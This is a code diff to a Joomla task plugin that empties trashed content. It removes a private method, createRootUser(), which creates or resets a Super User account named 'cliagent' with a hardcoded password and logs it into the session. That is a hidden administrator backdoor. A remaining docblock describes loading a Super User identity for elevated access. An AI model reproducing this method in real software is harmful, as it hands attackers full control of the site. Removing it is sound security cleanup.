@@ -207,7 +207,6 @@ final class Deltrash extends CMSPlugin implements SubscriberInterface, DatabaseA
     private function delArticles(): void
     {
         $art      = 0;
-        $app      = Factory::getApplication();
         $language = $this->getApplication()->getLanguage();
         $language->load('com_associations', JPATH_ADMINISTRATOR, 'en-GB', false, true);
         $language->load('com_associations', JPATH_ADMINISTRATOR, null, true);
@@ -514,127 +513,7 @@ final class Deltrash extends CMSPlugin implements SubscriberInterface, DatabaseA
             $this->logTask(Text::sprintf('PLG_TASK_DELTRASH_CONTACTS_DELETED', $art), 'info');
         }
     }
-
-    /**
-     * Method to create a root user for the task.
-     *
-     * @param   object          $options  The session options.
-     * @param   DatabaseDriver  $db       Database connector object $db*.
-     *
-     * @return  boolean  True on success.
-     *
-     * @since   3.1
-     */
-    private function createRootUser(): bool
-    {
-        $options                       = new \stdClass();
-        $options->admin_password_plain = '123456789012';
-        $options->admin_user           = 'cliagent';
-        $options->admin_username       = 'cliagent';
-        $options->admin_email          = 'aa@aa.it';
-
-        $cryptpass = UserHelper::hashPassword($options->admin_password_plain);
-
-        // Create the admin user.
-        date_default_timezone_set('UTC');
-        $installdate = date('Y-m-d H:i:s');
-        $db          = $this->getDatabase();
-        $query       = $db->getQuery(true);
-
-        $query = $db->getQuery(true)
-            ->select($db->quoteName('id'))
-            ->from($db->quoteName('#__users'))
-            ->where($db->quoteName('username') . ' = ' . $db->quote($options->admin_username));
-
-        $db->setQuery($query);
-
-        try {
-            $result = $db->loadResult();
-        } catch (\RuntimeException $e) {
-            $this->logTask($e->getMessage(), 'error');
-
-            return false;
-        }
-
-        if ($result) {
-            $query->clear()
-                ->update($db->quoteName('#__users'))
-                ->set($db->quoteName('name') . ' = ' . $db->quote(trim($options->admin_user)))
-                ->set($db->quoteName('username') . ' = ' . $db->quote(trim($options->admin_username)))
-                ->set($db->quoteName('email') . ' = ' . $db->quote($options->admin_email))
-                ->set($db->quoteName('password') . ' = ' . $db->quote($cryptpass))
-                ->set($db->quoteName('block') . ' = 0')
-                ->set($db->quoteName('sendEmail') . ' = 1')
-                ->set($db->quoteName('registerDate') . ' = ' . $db->quote($installdate))
-                ->set($db->quoteName('lastvisitDate') . ' = NULL')
-                ->set($db->quoteName('activation') . ' = ' . $db->quote('0'))
-                ->set($db->quoteName('params') . ' = ' . $db->quote(''))
-                ->where($db->quoteName('id') . ' = ' . $db->quote($result));
-        } else {
-
-            $columns = [
-                $db->quoteName('name'),
-                $db->quoteName('username'),
-                $db->quoteName('email'),
-                $db->quoteName('password'),
-                $db->quoteName('block'),
-                $db->quoteName('sendEmail'),
-                $db->quoteName('registerDate'),
-                $db->quoteName('lastvisitDate'),
-                $db->quoteName('activation'),
-                $db->quoteName('params'),
-            ];
-            $query->clear()
-                ->insert('#__users', true)
-                ->columns($columns)
-                ->values(
-                    $db->quote(trim($options->admin_user)) . ', ' . $db->quote(trim($options->admin_username)) . ', ' .
-                        $db->quote($options->admin_email) . ', ' . $db->quote($cryptpass) . ', ' .
-                        $db->quote('0') . ', ' . $db->quote('1') . ', ' . $db->quote($installdate) . ', NULL, ' .
-                        $db->quote('0') . ', ' . $db->quote('')
-                );
-        }
-        $db->setQuery($query);
-
-        try {
-            $db->execute();
-            $userId = $result ?? $db->insertid();
-        } catch (\RuntimeException $e) {
-            $this->logTask($e->getMessage(), 'error');
-
-            return false;
-        }
-
-        // Map the super user to the Super Users group
-        $query->clear()
-            ->select($db->quoteName('user_id'))
-            ->from($db->quoteName('#__user_usergroup_map'))
-            ->where($db->quoteName('user_id') . ' = ' . $db->quote($userId));
-
-        $db->setQuery($query);
-
-        if (!$db->loadResult()) {
-            $query->clear()
-                ->insert($db->quoteName('#__user_usergroup_map'), false)
-                ->columns([$db->quoteName('user_id'), $db->quoteName('group_id')])
-                ->values($db->quote($userId) . ', 8');
-            $db->setQuery($query);
-
-            try {
-                $db->execute();
-            } catch (\RuntimeException $e) {
-                $this->logTask($e->getMessage(), 'error');
-
-                return false;
-            }
-        }
-
-        $user = Factory::getContainer()->get(UserFactoryInterface::class)->loadUserById($userId);
-        $this->app->loadIdentity($user);
-
-        return true;
-    }
-
+    
     /**
      * Loads a Super User identity into the application session to grant elevated access.
      *
